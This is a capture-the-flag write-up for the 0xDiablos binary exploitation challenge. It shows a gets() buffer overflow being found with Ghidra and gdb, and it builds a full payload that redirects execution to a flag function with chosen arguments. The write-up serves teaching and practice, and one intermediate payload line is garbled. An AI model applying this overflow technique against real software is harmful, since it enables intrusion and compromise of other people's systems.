# 0xDiablos
- Pwn
- 20 Points

## Solution
Being able to run the program was the first problem. Attempting to run returned a strange `No such file or directory` error which was a bit confusing because the file definitly existed. Issue was because the file was 32 bit and I'm attempting to run it on a 64 bit machine. Fix was to install dependencies for 32 bit.

```Bash
sudo dpkg --add-architecture i386
sudo apt-get update
sudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386
```

Running the program now opens a prompt expecting some input from us.

```Bash
ubuntu@ubuntu:~$ ./vuln
You know who are 0xDiablos:
 
```

Opening up the binary in ghidra we can quickly find the main function and within main the function `vuln` is called. Vuln simply gets user input and does a puts. We can easily see the vulnerability is a buffer overflow because there are no checks to make sure the buffer `local_bc` is not given an input larger than 180.

```C
void vuln(void)

{
  char local_bc [180];
  
  gets(local_bc);
  puts(local_bc);
  return;
}
```
There is another function called `flag` which will print out `flag.txt` if some parameters are set.
```C
void flag(int param_1,int param_2)

{
  char local_50 [64];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 != (FILE *)0x0) {
    fgets(local_50,0x40,local_10);
    if ((param_1 == -0x21524111) && (param_2 == -0x3f212ff3)) {
      printf(local_50);
    }
    return;
  }
  puts("Hurry up and try in on server side.");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

So we need to overwrite the buffer to change the execution flow to the flag function and then also change some parameters to the ones needed to print the file. I used [peda](https://github.com/longld/peda), a nice addon for gdb, to debug the program and test/create the framework for my exploit. First step was to validate the buffer overflow and make the program crash. In vuln it is expecting input no larger than 180 so lets start by inputing 190.

```Bash
ubuntu@ubuntu:~$ (python -c "print('A' * 190)") | ./vuln
You know who are 0xDiablos
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

As expected the program crashed with a seg fault. Now lets begin debugging in gdb.
```gdb
ubuntu@ubuntu:~$ gdb ./vuln
gdb-peda$ disass vuln
Dump of assembler code for function vuln:
   0x08049272 <+0>:     push   ebp
   0x08049273 <+1>:     mov    ebp,esp
   0x08049275 <+3>:     push   ebx
   0x08049276 <+4>:     sub    esp,0xb4
   0x0804927c <+10>:    call   0x8049120 <__x86.get_pc_thunk.bx>
   0x08049281 <+15>:    add    ebx,0x2d7f
   0x08049287 <+21>:    sub    esp,0xc
   0x0804928a <+24>:    lea    eax,[ebp-0xb8]
   0x08049290 <+30>:    push   eax
   0x08049291 <+31>:    call   0x8049040 <gets@plt>
   0x08049296 <+36>:    add    esp,0x10
   0x08049299 <+39>:    sub    esp,0xc
   0x0804929c <+42>:    lea    eax,[ebp-0xb8]
   0x080492a2 <+48>:    push   eax
   0x080492a3 <+49>:    call   0x8049070 <puts@plt>
   0x080492a8 <+54>:    add    esp,0x10
   0x080492ab <+57>:    nop
   0x080492ac <+58>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x080492af <+61>:    leave
   0x080492b0 <+62>:    ret
End of assembler dump.
gdb-peda$ break *0x08049296
Breakpoint 1 at 0x8049296
```
We'll start by setting a breakpoint after the `gets` in `vuln` to inspect our input.

```gdb
gdb-peda$ r < <(python -c "print('A') * 192")
```
Using python to help us out with the input, we'll print 192 A's and redirect it to STDIN for the program.

```gdb
Starting program: /home/ubuntu/CTF/hackthebox/vuln < <(python -c "print('A' * 192)")
You know who are 0xDiablos:
[----------------------------------registers-----------------------------------]
EAX: 0xffffd0a0 ('A' <repeats 192 times>)
EBX: 0x804c000 --> 0x804bf10 --> 0x1
ECX: 0xf7fb45c0 --> 0xfbad2088
EDX: 0xf7fb589c --> 0x0
ESI: 0xf7fb4000 --> 0x1d4d8c
EDI: 0x0
EBP: 0xffffd158 ("AAAAAAAA")
ESP: 0xffffd090 --> 0xffffd0a0 ('A' <repeats 192 times>)
EIP: 0x8049296 (<vuln+36>:      add    esp,0x10)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804928a <vuln+24>: lea    eax,[ebp-0xb8]
   0x8049290 <vuln+30>: push   eax
   0x8049291 <vuln+31>: call   0x8049040 <gets@plt>
=> 0x8049296 <vuln+36>: add    esp,0x10
   0x8049299 <vuln+39>: sub    esp,0xc
   0x804929c <vuln+42>: lea    eax,[ebp-0xb8]
   0x80492a2 <vuln+48>: push   eax
   0x80492a3 <vuln+49>: call   0x8049070 <puts@plt>
[------------------------------------stack-------------------------------------]
0000| 0xffffd090 --> 0xffffd0a0 ('A' <repeats 192 times>)
0004| 0xffffd094 --> 0xf7fb4dc7 --> 0xfb58900a
0008| 0xffffd098 --> 0x1
0012| 0xffffd09c --> 0x8049281 (<vuln+15>:      add    ebx,0x2d7f)
0016| 0xffffd0a0 ('A' <repeats 192 times>)
0020| 0xffffd0a4 ('A' <repeats 188 times>)
0024| 0xffffd0a8 ('A' <repeats 184 times>)
0028| 0xffffd0ac ('A' <repeats 180 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08049296 in vuln ()
```
Our break point hits and we can already see some registers overwritten with A's.

```gdb
gdb-peda$ info frame
Stack level 0, frame at 0xffffd160:
 eip = 0x8049296 in vuln; saved eip = 0x41414141
 called by frame at 0xffffd164
 Arglist at 0xffffd158, args:
 Locals at 0xffffd158, Previous frame's sp is 0xffffd160
 Saved registers:
  ebx at 0xffffd154, ebp at 0xffffd158, eip at 0xffffd15c
gdb-peda$ x/64w $esp
0xffffd090:     0xffffd0a0      0xf7fb4dc7      0x00000001      0x08049281
0xffffd0a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd0b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd0c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd0d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd0e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd0f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd100:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd110:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd120:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd130:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd140:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd150:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd160:     0x00000000      0xffffd224      0xffffd22c      0x000003e8
0xffffd170:     0xffffd190      0x00000000      0x00000000      0xf7df7f21
0xffffd180:     0xf7fb4000      0xf7fb4000      0x00000000      0xf7df7f21
```
Inspecting our frame and stack we can see where our input landed. Most importantly, we can see `saved eip = 0x41414141`. We accomplished the first step of overwritting our saved eip register and what this means is after the `vuln` function has finished and returns it will attempt to return execution flow to address `0x41414141`. We know there is nothing at this address but if instead we changed eip to equal the address of the `flag` function it should jump to that function and begin executing. Let's give it a try.

```gdb
gdb-peda$ info func flag
All functions matching regular expression "flag":

Non-debugging symbols:
0x080491e2  flag
```
First we need the address to the flag function and above we can see the function resides at address `0x080491e2`. Now we need to work that address into our payload which can easily be accomplished using python's struct module.

```python
>>> import struct
>>> struct.pack("<L", 0x080491e2)
'\xe2\x91\x04\x08'
```
The `<L` is specifying a little endian unsigned long. Using the `file` command on the binary we can see `LSB executable` which stands for least significant byte which means little endian. We know the eip register for a 32 bit binary is only 4 bytes long so we need to fit the value `0x080491e2` in 4 bytes. `long` is 4 byte long structure so we can use it. Now our payload and run command look like: 
```gdb
r < <(python -c "print('A' * 188 + '08' ")
```
Putting a break in `vuln` and inspecting the frame returns
```gdb
gdb-peda$ info frame
Stack level 0, frame at 0xffffd160:
 eip = 0x80492af in vuln; saved eip = 0x80491e2
 called by frame at 0xffffd164
 Arglist at 0xffffd158, args:
 Locals at 0xffffd158, Previous frame's sp is 0xffffd160
 Saved registers:
  ebx at 0xffffd154, ebp at 0xffffd158, eip at 0xffffd15c
```

Looks like our payload worked and the saved eip is changed to the address of the `flag` function. Continuing we can see we landed right in the function.
```gdb
[----------------------------------registers-----------------------------------]
EAX: 0xc1
EBX: 0x41414141 ('AAAA')
ECX: 0xf7fb4dc7 --> 0xfb58900a
EDX: 0xf7fb5890 --> 0x0
ESI: 0xf7fb4000 --> 0x1d4d8c
EDI: 0x0
EBP: 0xffffd15c ("AAAA")
ESP: 0xffffd158 ("AAAAAAAA")
EIP: 0x80491e6 (<flag+4>:       sub    esp,0x54)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80491e2 <flag>:    push   ebp
   0x80491e3 <flag+1>:  mov    ebp,esp
   0x80491e5 <flag+3>:  push   ebx
=> 0x80491e6 <flag+4>:  sub    esp,0x54
   0x80491e9 <flag+7>:  call   0x8049120 <__x86.get_pc_thunk.bx>
   0x80491ee <flag+12>: add    ebx,0x2e12
   0x80491f4 <flag+18>: sub    esp,0x8
   0x80491f7 <flag+21>: lea    eax,[ebx-0x1ff8]
[------------------------------------stack-------------------------------------]
0000| 0xffffd158 ("AAAAAAAA")
0004| 0xffffd15c ("AAAA")
0008| 0xffffd160 --> 0x0
0012| 0xffffd164 --> 0xffffd224 --> 0xffffd3d7 ("/home/ubuntu/CTF/hackthebox/vuln")
0016| 0xffffd168 --> 0xffffd22c --> 0xffffd3f8 ("CLUTTER_IM_MODULE=xim")
0020| 0xffffd16c --> 0x3e8
0024| 0xffffd170 --> 0xffffd190 --> 0x1
0028| 0xffffd174 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080491e6 in flag ()
```

If you run the program through it will appear as if you completed the challenge. Inspecting the `flag` function further we can see that actually it requires a little more to print the flag file. We need to change two values on the stack so that they equal `0xdeadbeef` and `0xc0ded00d`. We can see `0xdeadbeef` is at ebp + 0x08 and `0xc0ded00d` at ebp + 0x0c. 

```gdb
[----------------------------------registers-----------------------------------]
EAX: 0xffffd110 ("YOU DID IT. ABOUT DAMN TIME\n")
EBX: 0x804c000 --> 0x804bf10 --> 0x1
ECX: 0x804e208 --> 0x0
EDX: 0xffffd110 ("YOU DID IT. ABOUT DAMN TIME\n")
ESI: 0xf7fb4000 --> 0x1d4d8c
EDI: 0x0
EBP: 0xffffd15c ("AAAA")
ESP: 0xffffd104 ('A' <repeats 12 times>, "YOU DID IT. ABOUT DAMN TIME\n")
EIP: 0x8049246 (<flag+100>:     cmp    DWORD PTR [ebp+0x8],0xdeadbeef)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804923d <flag+91>: push   eax
   0x804923e <flag+92>: call   0x8049050 <fgets@plt>
   0x8049243 <flag+97>: add    esp,0x10
=> 0x8049246 <flag+100>:        cmp    DWORD PTR [ebp+0x8],0xdeadbeef
   0x804924d <flag+107>:        jne    0x8049269 <flag+135>
   0x804924f <flag+109>:        cmp    DWORD PTR [ebp+0xc],0xc0ded00d
   0x8049256 <flag+116>:        jne    0x804926c <flag+138>
   0x8049258 <flag+118>:        sub    esp,0xc
[------------------------------------stack-------------------------------------]
0000| 0xffffd104 ('A' <repeats 12 times>, "YOU DID IT. ABOUT DAMN TIME\n")
0004| 0xffffd108 ("AAAAAAAAYOU DID IT. ABOUT DAMN TIME\n")
0008| 0xffffd10c ("AAAAYOU DID IT. ABOUT DAMN TIME\n")
0012| 0xffffd110 ("YOU DID IT. ABOUT DAMN TIME\n")
0016| 0xffffd114 ("DID IT. ABOUT DAMN TIME\n")
0020| 0xffffd118 ("IT. ABOUT DAMN TIME\n")
0024| 0xffffd11c ("ABOUT DAMN TIME\n")
0028| 0xffffd120 ("T DAMN TIME\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x08049246 in flag ()
```
Our ebp begins at `0xffffd15c` and our values need to be 8 and 12 bytes after that.
```gdb
gdb-peda$ x/x $ebp
0xffffd15c:     0x41
```

Viewing our stack, we can see where our A's end and the current values at 8 and 12 bytes ahead.
```gdb
gdb-peda$ x/w $ebp + 0x8
0xffffd164:     0xffffd224

gdb-peda$ x/64x $esp
0xffffd104:     0x41414141      0x41414141      0x41414141      0x20554f59
0xffffd114:     0x20444944      0x202e5449      0x554f4241      0x41442054
0xffffd124:     0x54204e4d      0x0a454d49      0x41414100      0x41414141
0xffffd134:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd144:     0x41414141      0x41414141      0x41414141      0x0804e170
0xffffd154:     0x41414141      0x41414141      0x41414141      0x00000000
0xffffd164:     0xffffd224      0xffffd22c      0x000003e8      0xffffd190
0xffffd174:     0x00000000      0x00000000      0xf7df7f21      0xf7fb4000
0xffffd184:     0xf7fb4000      0x00000000      0xf7df7f21      0x00000001
0xffffd194:     0xffffd224      0xffffd22c      0xffffd1b4      0x00000001
0xffffd1a4:     0x00000000      0xf7fb4000      0xf7fe570a      0xf7ffd000
0xffffd1b4:     0x00000000      0xf7fb4000      0x00000000      0x00000000
0xffffd1c4:     0x3376c29d      0x7228248d      0x00000000      0x00000000
0xffffd1d4:     0x00000000      0x00000001      0x080490d0      0x00000000
0xffffd1e4:     0xf7fead50      0xf7fe5960      0x0804c000      0x00000001
0xffffd1f4:     0x080490d0      0x00000000      0x08049102      0x080492b1
```
 To modify the values we should just have to place them after the address to `flag` in our payload.

```python
>>> struct.pack("<L", 0xdeadbeef)
'\xef\xbe\xad\xde'
>>> struct.pack("<L", 0xc0ded00d)
'\r\xd0\xde\xc0'

payload = 'A' * 188 + '\xe2\x91\x04\x08' + '\x00\x00\x00\x00' + '\xef\xbe\xad\xde' + '\r\xd0\xde\xc0'
```
We need the `'\x00\x00\x00\x00'` before because the first value is expected at ebp + 8 so there is four bytes inbetween that needs filling. Running the program again with the new payload appears to work and print the text I put in my local `flag.txt`.
